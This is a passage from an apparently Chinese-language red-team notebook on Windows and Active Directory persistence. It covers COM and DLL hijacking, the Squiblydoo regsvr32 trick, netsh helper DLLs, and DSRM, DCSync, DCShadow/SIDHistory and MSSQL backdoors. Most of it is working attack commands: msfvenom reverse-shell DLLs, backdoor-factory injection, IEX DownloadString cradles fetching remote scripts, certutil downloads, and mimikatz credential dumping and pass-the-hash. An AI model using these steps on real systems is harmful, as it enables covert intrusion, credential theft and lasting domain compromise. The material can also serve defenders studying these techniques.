&quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-NullNew-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Nullwmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dllcertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll deletecertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dllcertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll deleteSET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg_x64.dll&quot; /FREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /FREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F添加全局变量计算机\HKEY_CURRENT_USER\EnvironmentCOR_ENABLE_PROFILING=1COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;注册CLSID计算机\HKEY_CURRENT_USER\Software\Classes\CLSID添加项&#123;11111111-1111-1111-1111-111111111111&#125;和它的子项InprocServer32新建一个键ThreadingModel，键值为：Apartment，默认键值为dll路径劫持explorer.exe&gt;SET COR_ENABLE_PROFILING=1&gt;SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;位置(新建)HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\InprocServer32默认值为恶意DLL新建ThreadingModel值为Apartment</code></pre><h3 id="COM-OBJECT-hijacking"><a href="#COM-OBJECT-hijacking" class="headerlink" title="COM OBJECT hijacking"></a>COM OBJECT hijacking</h3><h4 id="CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="CAccPropServicesClass and MMDeviceEnumerato"></a>CAccPropServicesClass and MMDeviceEnumerato</h4><pre><code>无需超管权限，无需重启https://github.com/3gstudent/COM-Object-hijacking将恶意DLLbase64编码写入ps脚本</code></pre><p><img src="./img/463.png" alt="image"><br><img src="./img/464.png" alt="image"></p><pre><code>执行后会在%appdata%\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;目录释放2个文件，分别是x86和x64的dll会在注册表中HKEY_CURRENT_USER\Software\Classes\CLSID\新建&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;和子项默认指向恶意DLL只要指向.net程序便可上线。如ie，mmc等</code></pre><p><img src="./img/465.png" alt="image"></p><h4 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h4><pre><code>注册表位置：HKCU\Software\Classes\CLSID\创建项&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;创建子项InprocServer32Default的键值为恶意dll的绝对路径：C:\test\1.dll创建键值： ThreadingModel REG_SZ Apartment</code></pre><p><img src="./img/466.png" alt="image"></p><pre><code>HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</code></pre><h3 id="Squibledoo"><a href="#Squibledoo" class="headerlink" title="Squibledoo"></a>Squibledoo</h3><pre><code>创建1.sct</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?XML version="1.0"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scriptlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>registration</span>  <span class="token attr-name">description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Component<span class="token punctuation">"</span></span>  <span class="token attr-name">progid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Component.WindowsUpdate<span class="token punctuation">"</span></span>  <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.00<span class="token punctuation">"</span></span>  <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;20002222-0000-0000-0000-000000000002&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>registration</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>public</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>method</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>public</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token cdata">&lt;![CDATA[    function exec()&#123;      new ActiveXObject('WScript.Shell').Run('calc.exe');    &#125;  ]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scriptlet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>创建COM对象&gt;regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll触发&gt;cscript 1.jsvar test = new ActiveXObject(&quot;Component.TESTCB&quot;);test.exec()</code></pre><h3 id="DLL劫持-1"><a href="#DLL劫持-1" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h4 id="劫持1"><a href="#劫持1" class="headerlink" title="劫持1"></a>劫持1</h4><pre><code>注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls下添加 &quot;lpk.dll&quot;(若无，自己创建)ExcludeFromKnownDlls可使KnownDLLs失效需要重新启动电脑查找可劫持的DLL：1.启动程序2.使用Process Explorer查看该应用程序启动后加载的DLL。3.从已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs4.编写第三步中获取到的DLL的劫持DLL。5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</code></pre><p><img src="./img/467.png" alt="image"></p><pre><code>Explorer.exe启动调用winrar文件夹的RarExt.dllMsf监听</code></pre><p><img src="./img/468.png" alt="image"></p><pre><code>复制dll文件到the-backdoor-factory文件夹中，加载恶意dll进原dll&gt;python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 指定为kali监听的IP和端口</code></pre><p><img src="./img/469.png" alt="image"></p><pre><code>生成好的dll在backdoored文件夹，传入靶机中，替换原dll文件，最好把原dll保存备份。每次打开windows资源管理器的时候，即可上线。重启可维持</code></pre><p><img src="./img/470.png" alt="image"></p><h4 id="劫持2"><a href="#劫持2" class="headerlink" title="劫持2"></a>劫持2</h4><pre><code>使用https://github.com/coca1ne/DLL_Hijackerhttps://github.com/git20150901/DLLHijack_Detecter查看要劫持的DLL的函数导出表，会直接生成cpp源码，重编译指向恶意代码DLLHijack_Detecter可查看程序加载的不在KnownDLLs中的DLL</code></pre><h4 id="MSDTC服务劫持"><a href="#MSDTC服务劫持" class="headerlink" title="MSDTC服务劫持"></a>MSDTC服务劫持</h4><pre><code>服务名称MSDTC,显示名称Distributed Transaction Coordinator对应进程msdtc.exe,位于%windir%system32C:\Windows\System32\wbem\服务启动搜索注册表位置计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dllOci.dll放入c:\windows\system32\重启服务即可&gt;taskkill /f /im msdtc.exe</code></pre><h4 id="Rattler"><a href="#Rattler" class="headerlink" title="Rattler"></a>Rattler</h4><pre><code>自动化查找可劫持的DLLhttps://github.com/sensepost/rattler使用&gt;Rattler_x64.exe calc.exe 1会列出可被劫持的DLL</code></pre><p><img src="./img/471.png" alt="image"></p><pre><code>按程序读取DLL位置顺序，把恶意DLL放入程序同目录后，执行程序即可。</code></pre><p><img src="./img/472.png" alt="image"><br><img src="./img/473.png" alt="image"></p><h3 id="DLL代理劫持右键"><a href="#DLL代理劫持右键" class="headerlink" title="DLL代理劫持右键"></a>DLL代理劫持右键</h3><pre><code>右键对应的注册表路径是HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers使用autoruns查看加载的DLL</code></pre><p><img src="./img/474.png" alt="image"></p><pre><code>以rarext.dll为例使用https://github.com/rek7/dll-hijacking创建代理DLL注意修改parse.py中dumpbin.exe的位置</code></pre><p><img src="./img/475.png" alt="image"></p><pre><code>&gt;python3 parse.py -d rarext.dll</code></pre><p><img src="./img/476.png" alt="image"></p><pre><code>修改原DLL为rarext_.dll，重新生成解决方案命名为rarext.dll将两个DLL放入原目录，重启</code></pre><h3 id="使用AMSI扫描接口维持权限"><a href="#使用AMSI扫描接口维持权限" class="headerlink" title="使用AMSI扫描接口维持权限"></a>使用AMSI扫描接口维持权限</h3><pre><code>https://gist.github.com/b4rtik/48ef702603d5e283bc81a05a01fccd40现amsi已经集成到win10以下组件中UACPowerShellWindows脚本（wscript.exe和cscript.exe）JavaScript和VBScriptOffice VBA宏</code></pre><p><img src="./img/721.png" alt="image"></p><pre><code>这里使用nc来反弹个shell</code></pre><p><img src="./img/722.png" alt="image"></p><pre><code>使用regsvr32注册dll或手动添加HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID（默认）REG_SZ “提供程序描述”HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID\InprocServer32 (默认)REG_EXPAND_SZ &quot; DLL的路径&quot; -ThreadingModel REG_SZ &quot;Both&quot;HKLM \ SOFTWARE \ Microsoft \ AMSI \ Providers \ GUIDRegsvr32使用超管权限</code></pre><p><img src="./img/723.png" alt="image"></p><pre><code>一旦注册，Dll将被加载到任何涉及AMSI和SampleAmsiProvider::Scan方法的进程中，比如在程序中设定，在powershell下发送字符串，触发scan方法，当发送字符串为我们设定的字符串的时候就触发恶意DLL</code></pre><p><img src="./img/724.png" alt="image"><br><img src="./img/725.png" alt="image"></p><h3 id="DLL劫持计划任务"><a href="#DLL劫持计划任务" class="headerlink" title="DLL劫持计划任务"></a>DLL劫持计划任务</h3><pre class="line-numbers language-none"><code class="language-none">function Invoke-ScheduledTaskComHandlerUserTask&#123;[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]Param ([Parameter(Mandatory &#x3D; $True)][ValidateNotNullOrEmpty()][String]$Command,[Switch]$Force)$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;New-Item $ScheduledTaskCommandPath -Force |New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null&#125;else&#123;Write-Verbose &quot;Key already exists, consider using -Force&quot;exit&#125;if (Test-Path $ScheduledTaskCommandPath) &#123;Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;&#125;else&#123;Write-Warning &quot;Failed to create registry key, exiting&quot;exit&#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose重启权限可维持</code></pre><h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><h4 id="Powershell-6"><a href="#Powershell-6" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code>生成DLL&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll&gt;use exploit/multi/handler&gt;set payload windows/x64/meterpreter/reverse_tcp&gt;Powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1&#39;); Invoke-DllInjection -ProcessID pid -Dll .\1.dll&quot;</code></pre><h4 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h4><pre><code>生成DLL#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll#use exploit/multi/handler#set payload windows/x64/meterpreter/reverse_tcp使用如下命令注入进程&gt;InjectProc.exe dll_inj qq.dll xx.exe(存在的进程)</code></pre><p><img src="./img/477.png" alt="image"></p><h3 id="通过控制面板加载项维持权限"><a href="#通过控制面板加载项维持权限" class="headerlink" title="通过控制面板加载项维持权限"></a>通过控制面板加载项维持权限</h3><pre><code>编译为dll，这里是弹框测试</code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pch.h"</span></span><span class="token comment">//Cplapplet</span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> LONG <span class="token function">Cplapplet</span><span class="token punctuation">(</span>    HWND hwndCpl<span class="token punctuation">,</span>    UINT msg<span class="token punctuation">,</span>    LPARAM lParam1<span class="token punctuation">,</span>    LPARAM lParam2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"inject control panel."</span><span class="token punctuation">,</span> <span class="token string">"Control Panel"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span>    DWORD  ul_reason_for_call<span class="token punctuation">,</span>    LPVOID lpReserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Cplapplet</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/680.png" alt="image"></p><pre><code>添加到注册表中，只要运行control命令打开控制面板即可加载dllreg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs&quot; /v spotless /d &quot;C:\xxx\dll.dll&quot; /f</code></pre><p><img src="./img/681.png" alt="image"></p><h2 id="通过自定义-net垃圾回收机制进行DLL注入"><a href="#通过自定义-net垃圾回收机制进行DLL注入" class="headerlink" title="通过自定义.net垃圾回收机制进行DLL注入"></a>通过自定义.net垃圾回收机制进行DLL注入</h2><pre><code>低权限用户可指定.net应用程序使用自定义垃圾收集器（GC），一个自定义GC可以以COMPLUS_GCName此环境变量指定，只需将此环境变量指向到恶意DLL，自定义GC的DLL需要一个名为GC_VersionInfo的导出表。下面是个弹框DLL</code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span> HMODULE hModule<span class="token punctuation">,</span>                       DWORD  ul_reason_for_call<span class="token punctuation">,</span>                       LPVOID lpReserved                     <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">VersionInfo</span><span class="token punctuation">&#123;</span>    UINT32 MajorVersion<span class="token punctuation">;</span>    UINT32 MinorVersion<span class="token punctuation">;</span>    UINT32 BuildVersion<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> Name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">GC_VersionInfo</span><span class="token punctuation">(</span>VersionInfo <span class="token operator">*</span> info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    info<span class="token operator">-></span>BuildVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    info<span class="token operator">-></span>MinorVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    info<span class="token operator">-></span>BuildVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"giao"</span><span class="token punctuation">,</span> <span class="token string">"giao"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/686.png" alt="image"></p><pre><code>后执行任意.net程序可加载此DLL</code></pre><p><img src="./img/687.png" alt="image"></p><pre><code>当然也可以加载shellcodehttps://github.com/am0nsec/MCGC</code></pre><p><img src="./img/688.png" alt="image"><br><img src="./img/689.png" alt="image"><br><img src="./img/690.png" alt="image"></p><h3 id="Windows-FAX-DLL-Injection"><a href="#Windows-FAX-DLL-Injection" class="headerlink" title="Windows FAX DLL Injection"></a>Windows FAX DLL Injection</h3><pre><code>恶意DLL改名为fxsst.dll放置在c:\windows\目录即可实现对explorer.exe的劫持</code></pre><h3 id="DSRM-注册表ACL后门"><a href="#DSRM-注册表ACL后门" class="headerlink" title="DSRM+注册表ACL后门"></a>DSRM+注册表ACL后门</h3><pre><code>&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2允许DSRM账户远程访问https://github.com/HarmJ0y/DAMP效果：域内任何用户可读取域控hashsystem权限执行&gt;psexec.exe -accepteula -s -i -d cmd.exe域控制器执行PS&gt;Add-RemoteRegBackdoor -ComputerName 域控名 -Trustee &#39;S-1-1-0&#39; –Verbose</code></pre><p><img src="./img/478.png" alt="image"></p><pre><code>域内机器执行https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1PS&gt; Get-RemoteLocalAccountHash -ComputerName 域控 –Verbose</code></pre><p><img src="./img/479.png" alt="image"></p><pre><code>域控上执行&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2</code></pre><p><img src="./img/480.png" alt="image"></p><pre><code>PTH攻击，mimikatz需以管理员身份启动&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd&quot; exit</code></pre><p><img src="./img/481.png" alt="image"></p><h3 id="DCShadow-amp-SID-History"><a href="#DCShadow-amp-SID-History" class="headerlink" title="DCShadow&amp;SID History"></a>DCShadow&amp;SID History</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1DCShadow攻击是通过更改AD架构，使域内一台机器伪造成域控。此脚本可以通过修改AD对象提供DCShadow攻击的最小权限。运行此脚本需要DA(Domain Administrator)权限，可以使指定用户不需要DA权限使用mimikatz。域控：dc.zone.com域内机器：sub2k8.zone.com域内普通用户:y域控执行&gt;Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y –Verbose注册sub2k8为假DC，给予用户y从sub2k8修改dc的计算机对象的权限。</code></pre><p><img src="./img/482.png" alt="image"></p><pre><code>在sub2k8上，以本地system权限启动一个mimikatz会话，以zone\y权限启动一个mimikatz会话。</code></pre><p><img src="./img/483.png" alt="image"><br><img src="./img/484.png" alt="image"></p><pre><code>System权限窗口执行dcshadow攻击，修改dc的计算机属性Zone\y权限窗口用于推送添加域管理通过修改安全标识符，将域内普通用户y提升为域管理用户&gt;lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512</code></pre><p><img src="./img/485.png" alt="image"><br><img src="./img/486.png" alt="image"><br><img src="./img/487.png" alt="image"></p><pre><code>Zone\y推送&gt;lsadump::dcshadow /push</code></pre><p><img src="./img/488.png" alt="image"></p><pre><code>此时在域控上查询可见y用户已经加入域管理组。</code></pre><p><img src="./img/489.png" alt="image"></p><pre><code>添加SIDHistory后门记录域管理SID</code></pre><p><img src="./img/490.png" alt="image"></p><pre><code>&gt;Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose</code></pre><p><img src="./img/491.png" alt="image"></p><pre><code>&gt;lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500推送&gt;lsadump::dcshadow /push</code></pre><p><img src="./img/492.png" alt="image"></p><pre><code>测试</code></pre><p><img src="./img/493.png" alt="image"></p><pre><code>域控中通过mimikatz命令可查询到SIDHistory</code></pre><p><img src="./img/494.png" alt="image"></p><pre><code>删除SIDHistory的方法PS&gt;Get-ADUser -Filter &#123;name -eq &quot;y&quot;&#125; –Properties sidhistory|foreach &#123;Set-ADuser $_ –remove @&#123;sidhistory=&quot;S-1-5-21-2346829310-1781191092-2540298887-500&quot;&#125;&#125;</code></pre><p><img src="./img/495.png" alt="image"><br><img src="./img/496.png" alt="image"></p><pre><code>删除功能规则输入的规则后面加参数-remove即可。</code></pre><p><img src="./img/497.png" alt="image"></p><h3 id="DCSync后门"><a href="#DCSync后门" class="headerlink" title="DCSync后门"></a>DCSync后门</h3><pre><code>服务器管理器找到域-&gt;查看-&gt;启用高级功能-&gt;右键属性-&gt;安全-&gt;everyone完全控制&gt;mimikatz.exe &quot;lsadump::dcsync /domain:zone.com /user:administrator&quot; exit</code></pre><p><img src="./img/498.png" alt="image"></p><pre><code>或使用powerview添加一条ACL(域控执行)&gt;Add-DomainObjectAcl -TargetIdentity &quot;DC=ZONE,DC=COM&quot; -PrincipalIdentity 域内用户 -Rights DCSync -Verbose </code></pre><p><img src="./img/499.png" alt="image"></p><pre><code>使用此账户在域内任意主机可使用mimikatz的dcsync功能导出凭据</code></pre><p><img src="./img/500.png" alt="image"></p><pre><code>移除ACL&gt;Remove-DomainObjectAcl -TargetIdentity &quot;DC=zone,DC=com&quot; -PrincipalIdentity 用户 -Rights DCSync -Verbose</code></pre><h3 id="Netsh-Helper-DLL"><a href="#Netsh-Helper-DLL" class="headerlink" title="Netsh Helper DLL"></a>Netsh Helper DLL</h3><pre><code>https://github.com/outflanknl/NetshHelperBeaconhttps://github.com/rtcrowley/Offensive-Netsh-Helper</code></pre><h4 id="MSFvenom生成DLL"><a href="#MSFvenom生成DLL" class="headerlink" title="MSFvenom生成DLL"></a>MSFvenom生成DLL</h4><pre><code>生成DLL格式木马</code></pre><p><img src="./img/501.png" alt="image"></p><pre><code>传至靶机执行命令&gt;netsh add helper C:\Windows\Temp\help.dll</code></pre><p><img src="./img/502.png" alt="image"></p><h4 id="MSF-web-delivery"><a href="#MSF-web-delivery" class="headerlink" title="MSF+web_delivery"></a>MSF+web_delivery</h4><pre><code>关闭netsh权限不会掉，调用的powershell#use exploit/multi/script/web_delivery&gt;set target 2            #PSH&gt;set payload windows/x64/meterpreter/reverse_tcp&gt;set lhost 192.168.0.107&gt;set lport 12345</code></pre><p><img src="./img/503.png" alt="image"></p><pre><code>Visual Studio新建空白DLL项目，源文件添加现有文件https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp 复制生成的代码进文件中，配置管理器新建x64位数后生成解决方案，配置类型选择位动态库复制DLL到靶机执行</code></pre><p><img src="./img/504.png" alt="image"><br><img src="./img/505.png" alt="image"></p><pre><code>&gt;netsh add helper helper.dll</code></pre><p><img src="./img/506.png" alt="image"></p><h4 id="MSF-amp-Shellcode"><a href="#MSF-amp-Shellcode" class="headerlink" title="MSF&amp;Shellcode"></a>MSF&amp;Shellcode</h4><pre><code>关闭netsh后权限会掉https://github.com/outflanknl/NetshHelperBeaconMSFvenom生成.c格式&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.cVisual Studio打开项目若系统是64位需设置配置管理器为64位项目，反之32(解决方案右键属性)</code></pre><p><img src="./img/507.png" alt="image"></p><pre><code>将MSF生成shellcode粘贴进相应位置后生成解决方案。</code></pre><p><img src="./img/508.png" alt="image"><br><img src="./img/509.png" alt="image"></p><pre><code>会在项目目录x64/Release下生成dll复制DLL到靶机system32目录下，执行命令&gt;netsh add helper C:\Windows\System32\NetshHelperBeacon.dll</code></pre><p><img src="./img/510.png" alt="image"></p><pre><code>只要启动netsh就会触发</code></pre><p><img src="./img/511.png" alt="image"></p><h3 id="MSSQL后门"><a href="#MSSQL后门" class="headerlink" title="MSSQL后门"></a>MSSQL后门</h3><pre><code>注册表自启动&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegRun -Verbose -Name Update -Command &#39;c:\windows\temp\Update.exe&#39; -Instance &quot;zone.com\sub2k8&quot;&quot;重启MSSQL上线(需重启服务)http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1&gt;powershell -ep bypass &gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1&#39;) &gt;Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance &quot;zone.com\sub2k8&quot; 